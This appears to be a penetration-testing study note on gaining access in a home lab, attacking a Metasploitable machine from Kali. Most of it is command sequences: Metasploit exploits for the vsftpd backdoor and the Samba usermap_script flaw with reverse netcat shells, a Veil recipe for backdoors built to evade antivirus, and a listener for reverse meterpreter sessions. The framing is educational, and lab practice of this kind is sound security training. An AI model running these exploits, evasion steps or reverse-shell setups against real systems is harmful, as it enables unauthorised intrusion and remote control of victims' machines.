# Gaining Access

Two main approaches:

1. Server Side

2. Client Side

## Server Side

---

* To check if the Metasploitable machine and the Kali machine are on the same network, we can do a ping test:

```shell
ping 10.0.2.5
```

* zenmap can be used to gather more information about the server, as we have the IP now. Based on the vulnerable ports and services, we can discover more attacks on it.

* For each open port or service, we can Google them followed by the term 'exploit', and that will give us an idea about the vulnerabilities.

* Metasploit framework can be used to develop and launch exploits.

* Example of backdoor vulnerability:

```shell
msfconsole #launches Metasploit

use exploit/unix/ftp/vsftpd_234_backdoor #use particular exploit

show options

set RHOSTS 10.0.2.5

exploit #launch exploit
```

* Example of payload execution:

```shell
msfconsole

use exploit exploit/multi/samba/usermap_script

show options

set RHOSTS 10.0.2.5

show payloads #shows all possible payloads for particular exploit

#bind payloads open up a port on the target computer, and we can connect to it
#reverse payloads open up a port on our machine, and the target computer can connect to it
#reverse payloads can bypass firewalls

set PAYLOAD cmd/unix/reverse_netcat #sets payload

show options

set LHOST 10.0.2.4

exploit
```

## Client Side

---

* These attacks require user interaction and should be attempted if server-side attacks do not work.

* We can use Veil framework to generate backdoors which cannot be detected by anti-virus softwares.

```shell
veil

use 1 #uses evasion

list #shows list of payloads

use 15 #uses particular payload

set LHOST 10.0.2.7 #value as our IP

set LPORT 8080

set PROCESSORS 1 #making the payload unique by setting properties values

set SLEEP 5

generate #generate the backdoor
```

* Once backdoor is generated, we can check if it is detected by antivirus programs.

* To listen for incoming connections:

```shell
msfconsole

use exploit/multi/handler #module for listening incoming connections

show options

set PAYLOAD windows/meterpreter/reverse_https #set payload option

set LHOST 10.0.2.7 #set lhost as ip address

set LPORT 8080

exploit
```

---
